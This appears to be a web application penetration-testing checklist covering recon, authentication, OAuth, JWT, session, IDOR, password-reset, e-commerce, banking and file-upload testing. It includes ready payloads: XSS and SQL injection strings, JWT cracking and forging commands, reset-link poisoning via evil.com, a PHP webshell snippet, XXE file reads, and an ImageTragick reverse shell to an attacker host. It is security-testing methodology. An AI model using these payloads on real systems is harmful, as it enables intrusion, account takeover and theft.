# Analysis Checklist

## App Analysis [Slides](https://docs.google.com/presentation/d/1cMSRVlJJ5de6Pyv-09YgzOGS0OYrP6p7ggGl0f42wmw/edit#slide=id.g1228d591bfb_0_278)

### Initial Info Gathering

- [ ]  Port Scan ([Naabu](https://github.com/projectdiscovery/naabu))
- [ ]  Web Hosting Software
- [ ]  Application Framework and Libraries (Wappalyzer, https://github.com/projectdiscovery/httpx)
- [ ]  Integrations, 3rd Party apps
- [ ]  Identify WAF ([whatwaf](https://github.com/Ekultek/WhatWaf), [wafw00f](https://github.com/EnableSecurity/wafw00f))
- [ ]  Content Discovery (Check Content Discovery Tips)
- [ ]  Get urls ([gau](https://github.com/lc/gau) , [waybackurls](https://github.com/tomnomnom/waybackurls))
- [ ]  Spidering (Burp GAP, xnLinkfinder)
- [ ]  JS parsing (Burp GAP, xnLinkfinder)
- [ ]  Gather parameters (Burp GAP)

### Initial Analysis

- [ ]  Finding CVEs and Misconfigs (known vulns, Framework login pages, Default creds, etc.) (nuclei)
- [ ]  Big Question #1: How does the app pass data?
- [ ]  Big Question #2: How/where does the app talk about users?
- [ ]  Big Question #3: Does the site have multi-tenancy or user levels?
- [ ]  Big Question #4: Does the site have a unique threat model?
- [ ]  Big Question #5: Has there been past security research or vulns?
- [ ]  Big Question #6: How does the app handle XSS, CSRF, Code Injection, etc.
- [ ]  Review comments on source code (Burp Engagement Tools)
- [ ]  Any minified or webpacked JS unpacked and analyzed
- [ ]  JS hardcoded APIs and secrets ([nuclei-tokens](https://github.com/projectdiscovery/nuclei-templates/tree/4e3f843e15c68f816f0ef6abce5d30b6cf6d4a30/exposures/tokens))
- [ ]  Parameter analysis (GF Patterns)

### **Recon Phase**

- [ ]  Identify web server, technologies and database
- [ ]  Subsidiary and Acquisition Enumeration
- [ ]  Reverse Lookup
- [ ]  ASN & IP Space Enumeration and Service Enumeration
- [ ]  Google Dorking
- [ ]  Github Recon
- [ ]  Directory Enumeration
- [ ]  IP Range Enumeration
- [ ]  JS Files Analysis
- [ ]  Subdomain Enumeration and Bruteforcing
- [ ]  Subdomain Takeover
- [ ]  Parameter Fuzzing
- [ ]  Port Scanning
- [ ]  Template-Based Scanning(Nuclei)
- [ ]  Wayback History
- [ ]  Broken Link Hijacking
- [ ]  Internet Search Engine Discovery
- [ ]  Misconfigured Cloud Storage

### **Registration Feature Testing**

- [ ]  Check for duplicate registration/Overwrite existing user. (try with uppercase, +1@..., dots in name, etc)
- [ ]  Check for weak password policy
- [ ]  Check for reuse existing usernames
- Check for insufficient email verification process.
    
    <aside>
    💡 XSS
    
    test+(alert(0))@example.com
    test@example(alert(0)).com
    "alert(0)"@example.com
    <script src=//xsshere?”@email.com
    
    Template injection
    
    "<%= 7 * 7 %>"@example.com
    test+(${{7*7}})@example.com
    
    SQLi
    
    "' OR 1=1 -- '"@example.com
    "mail'); SELECT version();--"@example.com
    a'-IF(LENGTH(database())=9,SLEEP(7),0)or'1'='1\"@a.com
    
    - SSRF
    
    john.doe@abc123.burpcollaborator.net
    john.doe@[127.0.0.1]
    
    - Parameter pollution
    
    [victim&email=attacker@example.com](mailto:victim&email=attacker@example.com)
    
    - (Email) Header Injection
    
    "%0d%0aContent-Length:%200%0d%0a%0d%0a"@example.com
    "[recipient@test.com](mailto:recipient@test.com)>\r\nRCPT TO:<[victim+"@test.com](mailto:victim+%22@test.com)
    
    - Wildcard abuse
    
    %@example.com
    
    - Account tko
    
    my%00email@mail.com
    
    - Bypass whitelist
    
    inti([;inti@inti.io](mailto:;inti@inti.io);)@whitelisted.com
    [inti@inti.io](mailto:inti@inti.io)(@whitelisted.com)
    inti+(@whitelisted.com;)@inti.io
    
    #HTML Injection in Gmail
    inti.de.ceukelaire+(<b>bold<u>underline<s>strike<br/>newline<strong>strong<sup>sup<sub>sub)@gmail.com
    
    - Common email accounts
    
    support@
    jira@
    print@
    feedback@
    asana@
    slack@
    hello@
    bug(s)@
    upload@
    service@
    it@
    test@
    help@
    tickets@
    tweet@
    
    </aside>
    
- [ ]  Weak registration implementation-Allows disposable email addresses
- [ ]  Weak registration implementation-Over HTTP
- [ ]  Add only spaces in password
- [ ]  Long password (>200) leads to DoS
- [ ]  Corrupt authentication and session defects: Sign up, don't verify, request change password, change, check if account is active.
- [ ]  Try to re-register repeating same request with same password and different password too
- [ ]  If JSON request, add comma {“email”:“victim@mail.com”,”hacker@mail.com”,“token”:”xxxxxxxxxx”}
- [ ]  Lack of confirmation -> try to register with company email.
- [ ]  Check OAuth with social media registration
- [ ]  Check state parameter on social media registration
- [ ]  Try to capture integration url leading integration takeover
- [ ]  Check redirections in register page after login
- [ ]  Rate limit on account creation
- [ ]  XSS on name or email
- Overwrite default web application pages by specially crafted username registrations. => After registration, does your profile link appears something as www.example.com/johany?
    
    a. If so, enumerate default folders of web application such as /images, /contact, /portfolio
    
    b. Do a registration using the username such as images, contact, portfolio
    
    c. Check if those default folders have been overwritten by your profile link or not.
    

### **Authentication Testing**

- [ ]  Username enumeration
- [ ]  Resilience to password guessing
- [ ]  Account recovery function
- [ ]  "Remember me" function
- [ ]  Impersonation function
- [ ]  Unsafe distribution of credentials
- [ ]  Fail-open conditions
- [ ]  Multi-stage mechanisms
- [ ]  Auto-complete testing
- [ ]  Bypass authentication using various SQL Injections on username and password field
- Lack of password confirmation on
    - [ ]  Change email address
    - [ ]  Change password
    - [ ]  Manage 2FA
- [ ]  Is it possible to use resources without authentication? Access violation
- [ ]  Check if user credentials are transmitted over SSL or not
- [ ]  Weak login function HTTP and HTTPS both are available
- Test user account lockout mechanism on brute force attack
    
    Variation : If server blocks instant user requests, then try with time throttle option from intruder and repeat the process again.
    
    - [ ]  Bypass rate limiting by tampering user agent to Mobile User agent
    - [ ]  Bypass rate limiting by tampering user agent to Anonymous user agent
    - [ ]  Bypass rate limiting by using null byte
- [ ]  Create a password wordlist using cewl command and check
- Test response tampering in SAML authentication
    
    #https://developers.onelogin.com/saml
    
    #https://www.securing.pl/en/saml-what-can-go-wrong-security-check/
    
    #https://github.com/fadyosman/SAMLExtractor
    
    ./samle.py -u https://carbon-prototype.uberinternal.com/
    ./samle.py -r "https://domain.onelogin.com/trust/saml2/http-post/sso/571434?SAMLRequest=nVNNb9swDP0rhu7%2BkO0iqRAH8FIMC9BtRuLtOjAS2wqwJU%2Bi1%2FTfT3aSIoc1h10siXzie3yiVx76bhD1SC9mh79H9BQd%2B854MScqNjojLHjthYEevSAp9vXXR5EnmRicJSttx6LmvPukjdLm%2Bfa1wwnkxZe2beLm%2B75l0U90XltTsQBg0db7EbfGExgKoYwvY85jXrZZJgouijxAHiqGPC8XRblEDF9eZvcqX4DEXC3v70CpgkW19%2BgoFN5Y48ce3R7dHy3xx%2B6xYi9EgxdpKsEdrInnbuhtwGQ8oNOG0BnoEml7UZZFarWC4FI6%2BfJLnsqx9Wo6ilmvuzLutgFwUcXWFw0wDIk12NlnbSbKmSbtkUABQXq34GVRrtIrthP1IL6F8tuHxnZavkV119nXjUMgrBi5EVn02boe6GNBPOFzRKv4aYYK7EF3tVIOvWfphec8HajmWQl%2BEh4p2th%2BAKf99HR4BEkXS65Rmy50vMOn%2FzHoJkwKOZUO4SYsr9apaRBRBpWtA%2BMH6%2Bhs2r%2F0rE%2B5D3p7z17%2FHOu%2F&RelayState=%2F"
    
- Test Oauth login functionality
    - OAuth Roles
        - [ ]  Resource Owner → User
        - [ ]  Resource Server → Twitter
        - [ ]  Client Application → [Twitterdeck.com](http://twitterdeck.com/)
        - [ ]  Authorization Server → Twitter
        - [ ]  client_id → Twitterdeck ID (This is a public, non-secret unique identifier_
        - [ ]  client_secret → Secret Token known to the Twitter and Twitterdeck to generate access_tokens
        - [ ]  response_type → Defines the token type e.g (code, token, etc.)
        - [ ]  scope → The requested level of access Twitterdeck wants
        - [ ]  redirect_uri → The URL user is redirected to after the authorization is complete
        - [ ]  state → Main CSRF protection in OAuth can persist data between the user being directed to the authorization server and back again
        - [ ]  grant_type → Defines the grant_type and the returned token type
        - [ ]  code → The authorization code twitter generated, will be like ?code= , the code is used with client_id and client_secret to fetch an access_token
        - [ ]  access_token → The token twitterdeck uses to make API requests on behalf of the user
        - [ ]  refresh_token → Allows an application to obtain a new access_token without prompting the user
    - Code Flaws
        - [ ]  Re-Using the code
        - [ ]  Code Predict/Bruteforce and Rate-limit
        - [ ]  Is the code for application X valid for application Y?
    - Redirect_uri Flaws
        - [ ]  URL isn't validated at all: ?redirect_uri=https://attacker.com
        - [ ]  Subdomains allowed (Subdomain Takeover or Open redirect on those subdomains): ?redirect_uri=https://sub.twitterdeck.com
        - [ ]  Host is validated, path isn't Chain open redirect): ?redirect_uri=https://twitterdeck.com/callback?redirectUrl=https://evil.com
        - [ ]  Host is validated, path isn't (Referer leakages): Include external content on HTML page and leak code via Referer
        - [ ]  Weak Regexes
        - [ ]  Bruteforcing the URL encoded chars after host: redirect_uri=https://twitterdeck.com§FUZZ§
        - [ ]  Bruteforcing the keywords whitelist after host (or on any whitelist open redirect filter): ?redirect_uri=https://§FUZZ§.com
        - [ ]  URI validation in place: use typical open redirect payloads
    - State Flaws
        - [ ]  Missing State parameter? (CSRF)
        - [ ]  Predictable State parameter?
        - [ ]  Is State parameter being verified?
    - Misc
        - [ ]  Is client_secret validated?
        - [ ]  Pre ATO using facebook phone-number signup
        - [ ]  No email validation Pre ATO
- Test 2FA Misconfiguration
    - [ ]  Response Manipulation
    - [ ]  Status Code
    - [ ]  Manipulation
    - [ ]  2FA Code Leakage in Response
    - [ ]  2FA Code Reusability
    - [ ]  Lack of Brute-Force Protection
    - [ ]  Missing 2FA Code Integrity Validation
    - [ ]  With null or 000000
- [ ]  In OTP check guessable codes and race conditions
- [ ]  OTP, check response manipulation for bypass
- [ ]  OTP, try bruteforce
- If JWT, check common flaws
    
    <aside>
    💡 **Tools**
    
    [`https://github.com/ticarpi/jwt_tool`](https://github.com/ticarpi/jwt_tool)
    
    [`https://github.com/ticarpi/jwt_tool/wiki/Attack-Methodology`](https://github.com/ticarpi/jwt_tool/wiki/Attack-Methodology)
    
    [`https://github.com/hahwul/jwt-hack`](https://github.com/hahwul/jwt-hack)
    
    [`https://github.com/mazen160/jwt-pwn`](https://github.com/mazen160/jwt-pwn)
    
    [`https://github.com/mBouamama/MyJWT`](https://github.com/mBouamama/MyJWT)
    
    [`https://github.com/DontPanicO/jwtXploiter`](https://github.com/DontPanicO/jwtXploiter)
    
    **Test all common attacks**
    
    `python3 jwt_tool.py -t https://url_that_needs_jwt/ -rh "Authorization: Bearer JWT" -M at -cv "Welcome user!"`
    
    **Hashcat**
    
    #dictionary attacks
    
    `hashcat -a 0 -m 16500 jwt.txt passlist.txt`
    
    #rule-based attack
    
    `hashcat -a 0 -m 16500 jwt.txt passlist.txt -r rules/best64.rule`
    
    #brute-force attack
    
    `hashcat -a 3 -m 16500 jwt.txt ?u?l?l?l?l?l?l?l -i --increment-min=6`
    
    **Crack**
    
    `pip install PyJWT`
    
    #https://github.com/Sjord/jwtcrack
    
    #https://raw.githubusercontent.com/Sjord/jwtcrack/master/jwt2john.py
    
    [`jwt2john.py](http://jwt2john.py/) JWT
    ./john /tmp/token.txt --wordlist=wordlist.txt`
    
    **Wordlist generator crack tokens:**
    
    #https://github.com/dariusztytko/token-reverser
    
    **RS256 to HS256**
    
    `openssl s_client -connect [www.google.com:443](http://www.google.com:443/) | openssl x509 -pubkey -noout > public.pem
    cat public.pem | xxd -p | tr -d "\\n" > hex.txt`
    
    **Sign JWT with hex.txt**
    
    **Generate JWT from terminal**
    
    `pip install pyjwt`
    `python3 -c 'import jwt;print(jwt.encode({"role": "admin"},"SECRET",algorithm="HS256").decode("UTF-8"))'`
    
    **Header Attacks**
    
    #None algorithm
    
    `python3 jwt_tool.py <JWT> -X a`
    
    #From RS256 to HS256
    
    `python3 jwt_tool.py <JWT> -S hs256 -k public.pem`
    
    #Not checked signature
    
    `python3 jwt_tool.py <JWT> -I -pc name -pv admin`
    
    #Crack secret key
    
    `python3 jwt_tool.py <JWT> -C -d secrets.txt`
    
    #Null kid
    
    `python3 jwt_tool.py <JWT> -I -hc kid -hv "../../dev/null" -S hs256 -p ""`
    
    #Use source file as kid to verify signature
    
    `python3 jwt_tool.py -I -hc kid -hv "path/of/the/file" -S hs256 -p "Content of the file"`
    
    #jku manipulation for open redirect
    
    `python3 jwt_tool.py <JWT> -X s -ju "https://attacker.com/jwttool_custom_jwks.json"`
    
    #x5u manipulation for open redirect
    
    `openssl req -newkey rsa:2048 -nodes -keyout private.pem -x509 -days 365 -out attacker.crt -subj "/C=AU/L=Brisbane/O=CompanyName/CN=pentester"
    python3 jwt_tool.py <JWT> -S rs256 -pr private.pem -I -hc x5u -hv "https://attacker.com/custom_x5u.json"`
    
    **Payload Attacks**
    
    #SQLi
    
    `python3 jwt_tool.py <JWT> -I -pc name -pv "imparable' ORDER BY 1--" -S hs256 -k public.pem`
    
    #Manipulate other values to change expiration time or userID for example
    
    </aside>
    
- [ ]  Browser cache weakness (eg Pragma, Expires, Max-age)
- [ ]  After register, logout, clean cache, go to home page and paste your profile url in browser, check for "login?next=accounts/profile" for open redirect or XSS with "/login?next=javascript:alert(1);//"
- [ ]  Try login with common [credentials](https://github.com/ihebski/DefaultCreds-cheat-sheet)

### **Session Management Testing**

- [ ]  Identify actual session cookie out of bulk cookies in the application
- [ ]  Decode cookies using some standard decoding algorithms such as Base64, hex, URL, etc
- [ ]  Modify cookie.session token value by 1 bit/byte. Then resubmit and do the same for all tokens. Reduce the amount of work you need to perform in order to identify which part of the token is actually being used and which is not
- [ ]  If self-registration is available and you can choose your username, log in with a series of similar usernames containing small variations between them, such as A, AA, AAA, AAAA, AAAB, AAAC, AABA, and so on. If another user-specific data is submitted at login or stored in user profiles (such as an email address)
- [ ]  Check for session cookies and cookie expiration date/time
- [ ]  Identify cookie domain scope
- [ ]  Check for HttpOnly flag in cookie
- [ ]  Check for Secure flag in cookie if the application is over SSL
- [ ]  Check for session fixation i.e. value of session cookie before and after authentication
- [ ]  Replay the session cookie from a different effective IP address or system to check whether the server maintains the state of the machine or not
- [ ]  Check for concurrent login through different machine/IP
- [ ]  Check if any user pertaining information is stored in cookie value or not If yes, tamper it with other user's data
- [ ]  Failure to Invalidate Session on (Email Change,2FA Activation)
- [ ]  Path traversal on cookies
- [ ]  Reuse cookie after session closed
- [ ]  Logout and click browser "go back" function (Alt + Left arrow)
- [ ]  2 instances open, 1st change or reset password, refresh 2nd instance
- [ ]  With privileged user perform privileged actions, try to repeat with unprivileged user cookie.

### **My Account (Post Login) Testing (IDOR)**

- [ ]  Find parameter which uses active account user id. Try to tamper it in order to change the details of the other accounts
- [ ]  Create a list of features that are pertaining to a user account only. Change Email Change Password -Change account details (Name, Number, Address, etc.) Try CSRF
- [ ]  Post login change email id and update with any existing email id. Check if its getting validated on server side or not.
- [ ]  Does the application send any new email confirmation link to a new user or not? What if a user does not confirm the link in some time frame?
- [ ]  Open profile picture in a new tab and check the URL. Find email id/user id info. EXIF Geolocation Data Not Stripped From Uploaded Images.
- [ ]  File [upload](https://www.notion.so/enumeration/web/upload-bypasses): [eicar](https://secure.eicar.org/eicar.com.txt), No Size Limit, File extension, Filter Bypass, [burp](https://github.com/portswigger/upload-scanner) extension, RCE
- [ ]  Check account deletion option if application provides it and confirm that via forgot password feature
- [ ]  Change email id, account id, user id parameter and try to brute force other user's password
- [ ]  Check whether application re authenticates for performing sensitive operation for post authentication features
- [ ]  CSV import/export: Command Injection, XSS, macro injection
- [ ]  Try parameter pollution to add two values of same field

### **Forgot Password Testing**

- [ ]  Failure to invalidate session on Logout and Password reset
- [ ]  Check if forget password reset link/code uniqueness
- [ ]  Check if reset link does get expire or not if its not used by the user for certain amount of time
- [ ]  Find user account identification parameter and tamper Id or parameter value to change other user's password
- [ ]  Check for weak password policy
- [ ]  Weak password reset implementation Token is not invalidated after use
- [ ]  If reset link has another param such as date and time, then. Change date and time value in order to make active & valid reset link
- [ ]  Check if security questions are asked? How many guesses allowed? --> Lockout policy maintained or not?
- [ ]  Add only spaces in new password and confirmed password. Then Hit enter and see the result
- [ ]  Does it display old password on the same page after completion of forget password formality?
- [ ]  Ask for two password reset link and use the older one from user's email
- [ ]  Check if active session gets destroyed upon changing the password or not?
- [ ]  Weak password reset implementation Password reset token sent over HTTP
- [ ]  Send continuous forget password requests so that it may send sequential tokens
- [ ]  Use username@burp_collab.net and analyze the callback
- [ ]  Host header injection for token leakage
- [ ]  Add X-Forwarded-Host: evil.com to receive the reset link with evil.com
- [ ]  Email crafting like victim@gmail.com@target.com
- [ ]  IDOR in reset link
- [ ]  Capture reset token and use with other email/userID
- [ ]  No TLD in email parameter
- [ ]  User carbon copy email=victim@mail.com%0a%0dcc:hacker@mail.com
- [ ]  Long password (>200) leads to DoS
- [ ]  No rate limit, capture request and send over 1000 times
- [ ]  Check encryption in reset password token
- [ ]  Token leak in referer header
- [ ]  Append second email param and value
- [ ]  Understand how token is generated (timestamp, username, birthdate,...)
- [ ]  Response manipulation

### **Contact Us Form Testing**

- [ ]  Is CAPTCHA implemented on contact us form in order to restrict email flooding attacks?
- [ ]  Does it allow to upload file on the server?
- [ ]  Blind XSS

### **Product Purchase Testing**

- Buy Now
    - [ ]  Tamper product ID to purchase other high valued product with low prize
    - [ ]  Tamper product data in order to increase the number of product with the same prize
- Gift/Voucher
    - [ ]  Tamper gift/voucher count in the request (if any) to increase/decrease the number of vouchers/gifts to be used
    - [ ]  Tamper gift/voucher value to increase/decrease the value of the voucher in terms of money. (e.g. $100 is given as a voucher, tamper value to increase, decrease money)
    - [ ]  Reuse gift/voucher by using old gift values in parameter tampering
    - [ ]  Check the uniqueness of gift/voucher parameter and try guessing other gift/voucher code
    - [ ]  Use parameter pollution technique to add the same voucher twice by adding same parameter name and value again with & in the BurpSuite request
- Add/Delete Product from Cart
    - [ ]  Tamper user id to delete products from other user's cart
    - [ ]  Tamper cart id to add/delete products from other user's cart
    - [ ]  Identify cart id/user id for cart feature to view the added items from other user's account
- Address
    - [ ]  Tamper BurpSuite request to change other user's shipping address to yours
    - [ ]  Try stored XSS by adding XSS vector on shipping address
    - [ ]  Use parameter pollution technique to add two shipping address instead of one trying to manipulate application to send same item on two shipping address
- Place Order
    - [ ]  Tamper payment options parameter to change the payment method. E.g. Consider some items cannot be ordered for cash on delivery but tampering request parameters from debit/credit/PayPal/net banking option to cash on delivery may allow you to place order for that particular item
    - [ ]  Tamper the amount value for payment manipulation in each main and sub requests and responses
    - [ ]  Check if CVV is going in cleartext or not
    - [ ]  Check if the application itself processes your card details and then performs a transaction or it calls any third-party payment processing company to perform a transaction
- Track Order
    - [ ]  Track other user's order by guessing order tracking number
    - [ ]  Brute force tracking number prefix or suffix to track mass orders for other users
- Wish list page testing
    - [ ]  Check if a user A can add/remote products in Wishlist of other user B’s account
    - [ ]  Check if a user A can add products into user B’s cart from his/her (user A’s) Wishlist section.
- Post product purchase testing
    - [ ]  Check if user A can cancel orders for user B’s purchase
    - [ ]  Check if user A can view/check orders already placed by user B
    - [ ]  Check if user A can modify the shipping address of placed order by user B
- Out of band testing
    - [ ]  Can user order product which is out of stock?

### **Banking Application Testing**

- Billing Activity
    - [ ]  Check if user 'A' can view the account statement for user 'B'
    - [ ]  Check if user 'A' can view the transaction report for user 'B'
    - [ ]  Check if user 'A' can view the summary report for user 'B'
    - [ ]  Check if user 'A' can register for monthly/weekly account statement via email behalf of user 'B'
    - [ ]  Check if user 'A' can update the existing email id of user 'B' in order to retrieve monthly/weekly account summary
- Deposit/Loan/Linked/External Account Checking
    - [ ]  Check if user 'A' can view the deposit account summary of user 'B'
    - [ ]  Check for account balance tampering for Deposit accounts
- Tax Deduction Inquiry Testing
    - [ ]  Check if user 'A' with it's customer id 'a' can see the tax deduction details of user 'B' by tampering his/her customer id 'b'
    - [ ]  Check parameter tampering for increasing and decreasing interest rate, interest amount, and tax refund
    - [ ]  Check if user 'A' can download the TDS details of user 'B’
    - [ ]  Check if user 'A' can request for the cheque book behalf of user ‘B’.
- Fixed Deposit Account Testing
    - [ ]  Check if is it possible for user 'A' to open FD account behalf of user 'B'
    - [ ]  Check if Can user open FD account with the more amount than the current account balance
- Stopping Payment on basis of cheque/date range
    - [ ]  Can user 'A' stop the payment of user 'B' via cheque number
    - [ ]  Can user 'A' stop the payment on basis of date range for user 'B’
- Status Enquiry Testing
    - [ ]  Can user 'A' view the status enquiry of user 'B'
    - [ ]  Can user 'A' modify the status enquiry of user 'B'
    - [ ]  Can user 'A' post and enquiry behalf of user 'B' from his own account
- Fund transfer testing
    - [ ]  Is it possible to transfer funds to user 'C' instead of user 'B' from the user 'A' which was intended to transfer from user 'A' to user 'B'
    - [ ]  Can fund transfer amount be manipulated?
    - [ ]  Can user 'A' modify the payee list of user 'B' by parameter manipulation using his/her own account
    - [ ]  Is it possible to add payee without any proper validation in user 'A' 's own account or to user 'B' 's account
- Schedule transfer testing
    - [ ]  Can user 'A' view the schedule transfer of user 'B'
    - [ ]  Can user 'A' change the details of schedule transfer for user 'B’
- Testing of fund transfer via NEFT
    - [ ]  Amount manipulation via NEFT transfer
    - [ ]  Check if user 'A' can view the NEFT transfer details of user 'B’
- Testing for Bill Payment
    - [ ]  Check if user can register payee without any checker approval
    - [ ]  Check if user 'A' can view the pending payments of user 'B'
    - [ ]  Check if user 'A' can view the payment made details of user 'B'

### **SSO Vulnerabilities**

- [ ]  If [internal.company.com](http://internal.company.com/) Redirects You To SSO e.g. [auth.company.com](http://auth.company.com/), Do FUZZ On [Internal.company.com](http://internal.company.com/)
- [ ]  If [company.com/internal](http://company.com/internal) Redirects You To SSO e.g. Google login, Try To Insert public Before internal e.g. [company.com/public/internal](http://company.com/public/internal) To Gain Access Internal
- [ ]  Try To Craft SAML Request With Token And Send It To The Server And Figure Out How Server Interact With This
- [ ]  If There Is AssertionConsumerServiceURL In Token Request Try To Insert Your Domain e.g. [http://me.com](http://me.com/) As Value To Steal The Token
- [ ]  If There Is AssertionConsumerServiceURL In Token Request Try To Do FUZZ On Value Of AssertionConsumerServiceURL If It Is Not Similar To Origin
- [ ]  If There Is Any UUID, Try To Change It To UUID Of Victim Attacker e.g. Email Of Internal Employee Or Admin Account etc
- [ ]  Try To Figure Out If The Server Vulnerable To XML Signature Wrapping OR Not?
- [ ]  Try To Figure Out If The Server Checks The Identity Of The Signer OR Not?
- [ ]  Try To Inject XXE Payloads At The Top Of The SAML Response
- [ ]  Try To Inject XSLT Payloads Into The Transforms Element As A Child Node Of The SAML Response
- [ ]  If Victim Can Accept Tokens Issued By The Same Identity Provider That Services Attacker, So You Can Takeover Victim Account
- [ ]  While Testing SSO Try To search In Burp Suite About URLs In Cookie Header e.g. Host=IP; If There Is Try To Change IP To Your IP To Get SSRF

### **CAPTCHA Testing**

- [ ]  Missing Captcha Field Integrity Checks
- [ ]  HTTP Verb Manipulation
- [ ]  Content Type Conversion
- [ ]  Reusuable Captcha
- [ ]  Check if captcha is retrievable with the absolute path such as [www.tushar.com/internal/captcha/images/24.png](http://www.chintan.com/internal/captcha/images/24.png)
- [ ]  Check for the server side validation for CAPTCHA.Remove captcha block from GUI using firebug addon and submit request to the server
- [ ]  Check if image recognition can be done with OCR tool? LLM?

### **JWT Token Testing**

- [ ]  Brute-forcing secret keys
- [ ]  Signing a new token with the “none” algorithm
- [ ]  Changing the signing algorithm of the token (for fuzzing purposes)
- [ ]  Signing the asymmetrically-signed token to its symmetric algorithm match (when you have the original public key)

### **Websockets Testing**

- [ ]  Intercepting and modifying WebSocket messages
- [ ]  Websockets MITM attempts
- [ ]  Testing secret header websocket
- [ ]  Content stealing in websockets
- [ ]  Token authentication testing in websockets

### **GraphQL Vulnerabilities Testing**

- [ ]  Inconsistent Authorization Checks
- [ ]  Missing Validation of Custom Scalars
- [ ]  Failure to Appropriately Rate-limit
- [ ]  Introspection Query Enabled/Disabled

### **WordPress Common Vulnerabilities**

- [ ]  XSPA in wordpress
- [ ]  Bruteforce in wp-login.php
- [ ]  Information disclosure wordpress username
- [ ]  Backup file wp-config exposed
- [ ]  Log files exposed
- [ ]  Denial of Service via load-styles.php
- [ ]  Denial of Service via load-scripts.php
- [ ]  DDOS using xmlrpc.php
- [ ]  CVE-2018-6389
- [ ]  CVE-2021-24364
- [ ]  WP-Cronjob DOS

### **Denial of Service**

- [ ]  Cookie bomb
- [ ]  Pixel flood, using image with a huge pixels
- [ ]  Frame flood, using GIF with a huge frame
- [ ]  ReDoS (Regex DoS)
- [ ]  CPDoS (Cache Poisoned Denial of Service)

### **403 Bypass**

- [ ]  Using "X-Original-URL" header
- [ ]  Appending **%2e** after the first slash
- [ ]  Try add dot (.) slash (/) and semicolon (;) in the URL
- [ ]  Add "..;/" after the directory name
- [ ]  Try to uppercase the alphabet in the url
- [ ]  Tool-**[bypass-403](https://github.com/daffainfo/bypass-403)**
- [ ]  Burp Extension-[403 Bypasser](https://portswigger.net/bappstore/444407b96d9c4de0adb7aed89e826122)

### Input Handling

- File Upload Testing
    - [ ]  upload the malicious file to the archive upload functionality and observe how the application responds
    - [ ]  upload a file and change its path to overwrite an existing system file
    - [ ]  Large File Denial of Service
    - [ ]  Metadata Leakage
    - [ ]  ImageMagick Library Attacks
    - [ ]  Pixel Flood Attack
    - Cheatsheet
        
        ```jsx
        upload.random123				---	To test if random file extensions can be uploaded.
        upload.php							---	try to upload a simple php file.
        upload.php.jpeg 				--- 	To bypass the blacklist.
        upload.jpg.php 					---	To bypass the blacklist. 
        upload.php 							---	and Then Change the content type of the file to image or jpeg.
        upload.php*							---	version - 1 2 3 4 5 6 7.
        upload.PHP							---	To bypass The BlackList.
        upload.PhP							---	To bypass The BlackList.
        upload.pHp							---	To bypass The BlackList.
        upload .htaccess 				--- 	By uploading this [jpg,png] files can be executed as php with milicious code within it.
        pixelFlood.jpg					---	To test againt the DOS.
        frameflood.gif					---	upload gif file with 10^10 Frames
        Malicious zTXT  				--- 	upload UBER.jpg 
        Upload zip file					---	test againts Zip slip (only when file upload supports zip file)
        Check Overwrite Issue		--- 	Upload file.txt and file.txt with different content and check if 2nd file.txt overwrites 1st file
        SVG to XSS							---	Check if you can upload SVG files and can turn them to cause XSS on the target app
        SQLi Via File upload		---	Try uploading `sleep(10)-- -.jpg` as file
        ```
        
    - Payloads
        
        ```jsx
        # File name validation
            # extension blacklisted:
            PHP: .phtm, phtml, .phps, .pht, .php2, .php3, .php4, .php5, .shtml, .phar, .pgif, .inc
            ASP: .asp, .aspx, .cer, .asa
            Jsp: .jsp, .jspx, .jsw, .jsv, .jspf
            Coldfusion: .cfm, .cfml, .cfc, .dbm
            Using random capitalization: .pHp, .pHP5, .PhAr
            pht,phpt,phtml,php3,php4,php5,php6,php7,phar,pgif,phtm,phps,shtml,phar,pgif,inc
            # extension whitelisted:
            file.jpg.php
            file.php.jpg
            file.php.blah123jpg
            file.php%00.jpg
            file.php\x00.jpg
            file.php%00
            file.php%20
            file.php%0d%0a.jpg
            file.php.....
            file.php/
            file.php.\
            file.
            .html
        # Content type bypass
            - Preserve name, but change content-type
            Content-Type: image/jpeg, image/gif, image/png
        # Content length:
            # Small bad code:
            <?='$_GET[x]'?>
            
        # Impact by extension
        asp, aspx, php5, php, php3: webshell, rce
        svg: stored xss, ssrf, xxe
        gif: stored xss, ssrf
        csv: csv injection
        xml: xxe
        avi: lfi, ssrf
        html, js: html injection, xss, open redirect
        png, jpeg: pixel flood attack dos
        zip: rce via lfi, dos
        pdf, pptx: ssrf, blind xxe
        
        # Path traversal
        ../../etc/passwd/logo.png
        ../../../logo.png
        
        # SQLi
        'sleep(10).jpg
        sleep(10)-- -.jpg
        
        # Command injection
        ; sleep 10;
        
        # ImageTragick
        push graphic-context
        viewbox 0 0 640 480
        fill 'url(https://127.0.0.1/test.jpg"|bash -i >& /dev/tcp/attacker-ip/attacker-port 0>&1|touch "hello)'
        pop graphic-context
        
        # XXE .svg
        <?xml version="1.0" standalone="yes"?>
        <!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/hostname" > ]>
        <svg width="500px" height="500px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1
        <text font-size="40" x="0" y="16">&xxe;</text>
        </svg>
        
        <svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="300" version="1.1" height="200">
        <image xlink:href="expect://ls"></image>
        </svg>
        
        # XSS svg
        <svg onload=alert(document.comain)>.svg
        <?xml version="1.0" standalone="no"?>
        <!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
        File Upload Checklist 3
        <svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
        <rect width="300" height="100" style="fill:rgb(0,0,255);stroke-width:3;stroke:rgb(0,0,0)" />
        <script type="text/javascript">
        alert("HolyBugx XSS");
        </script>
        </svg>
        
        # Open redirect svg
        <code>
        <?xml version="1.0" encoding="UTF-8" standalone="yes"?>
        <svg
        onload="window.location='https://attacker.com'"
        xmlns="http://www.w3.org/2000/svg">
        <rect width="300" height="100" style="fill:rgb(0,0,255);stroke-width:3;stroke:rgb(0,0,0)" />
        </svg>
        </code>
            
        # Filter Bypassing Techniques
        # upload asp file using .cer & .asa extension (IIS — Windows)
        # Upload .eml file when content-type = text/HTML
        # Inject null byte shell.php%001.jpg
        # Check for .svg file upload you can achieve stored XSS using XML payload
        # put file name ../../logo.png or ../../etc/passwd/logo.png to get directory traversal via upload file
        # Upload large size file for DoS attack test using the image.
        # (magic number) upload shell.php change content-type to image/gif and start content with GIF89a; will do the job!
